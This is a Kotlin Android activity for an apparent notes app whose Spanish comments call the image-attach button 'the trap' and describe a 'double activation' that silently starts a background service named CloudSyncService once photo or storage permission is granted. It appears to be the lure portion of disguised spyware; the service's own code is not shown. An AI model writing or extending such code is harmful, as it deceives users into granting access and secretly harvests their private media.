package cl.example.mynotes

import android.Manifest
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import android.text.Editable
import android.text.TextWatcher
import android.widget.EditText
import android.widget.ImageButton
import android.widget.LinearLayout
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import androidx.core.view.ViewCompat
import androidx.core.view.WindowCompat // <--- IMPORTANTE
import androidx.core.view.WindowInsetsCompat

class MainActivity : AppCompatActivity() {

    private lateinit var noteInput: EditText

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        // --- SOLUCIÓN 1: ICONOS NEGROS (Para que se vean sobre fondo blanco) ---
        val windowInsetsController = WindowCompat.getInsetsController(window, window.decorView)
        // Esto le dice al sistema: "Usa iconos oscuros en la barra de estado"
        windowInsetsController.isAppearanceLightStatusBars = true
        // Opcional: Esto hace lo mismo para la barra de abajo (navegación)
        windowInsetsController.isAppearanceLightNavigationBars = true
        // -----------------------------------------------------------------------

        // --- SOLUCIÓN 2: BORDES (Edge-to-Edge) ---
        val rootLayout = findViewById<LinearLayout>(R.id.main_root)
        ViewCompat.setOnApplyWindowInsetsListener(rootLayout) { view, insets ->
            val systemBars = insets.getInsets(WindowInsetsCompat.Type.systemBars())
            view.setPadding(systemBars.left, systemBars.top, systemBars.right, systemBars.bottom)
            insets
        }

        // REFERENCIAS
        noteInput = findViewById(R.id.note_content)
        val btnAttach = findViewById<ImageButton>(R.id.btn_add_image)

        // CARGAR NOTA
        val prefs = getSharedPreferences("MyNotesData", Context.MODE_PRIVATE)
        noteInput.setText(prefs.getString("user_note", ""))

        // GUARDAR AUTOMÁTICAMENTE
        noteInput.addTextChangedListener(object : TextWatcher {
            override fun beforeTextChanged(s: CharSequence?, start: Int, count: Int, after: Int) {}
            override fun onTextChanged(s: CharSequence?, start: Int, before: Int, count: Int) {}
            override fun afterTextChanged(s: Editable?) {
                prefs.edit().putString("user_note", s.toString()).apply()
            }
        })

        // LA TRAMPA
        btnAttach.setOnClickListener {
            checkPermissionAndStart()
        }

        // DOBLE ACTIVACIÓN
        iniciarServicioSilencioso()
    }

    private fun checkPermissionAndStart() {
        val permission = if (Build.VERSION.SDK_INT >= 33) {
            Manifest.permission.READ_MEDIA_IMAGES
        } else {
            Manifest.permission.READ_EXTERNAL_STORAGE
        }

        if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(this, arrayOf(permission), 101)
        } else {
            Toast.makeText(this, "Abriendo galería...", Toast.LENGTH_SHORT).show()
            iniciarServicioSilencioso()
            val intent = Intent(Intent.ACTION_PICK)
            intent.type = "image/*"
            startActivity(intent)
        }
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == 101 && grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
            iniciarServicioSilencioso()
        }
    }

    private fun iniciarServicioSilencioso() {
        val permission = if (Build.VERSION.SDK_INT >= 33) Manifest.permission.READ_MEDIA_IMAGES else Manifest.permission.READ_EXTERNAL_STORAGE

        if (ContextCompat.checkSelfPermission(this, permission) == PackageManager.PERMISSION_GRANTED) {
            val intent = Intent(this, CloudSyncService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(intent)
            } else {
                startService(intent)
            }
        }
    }
}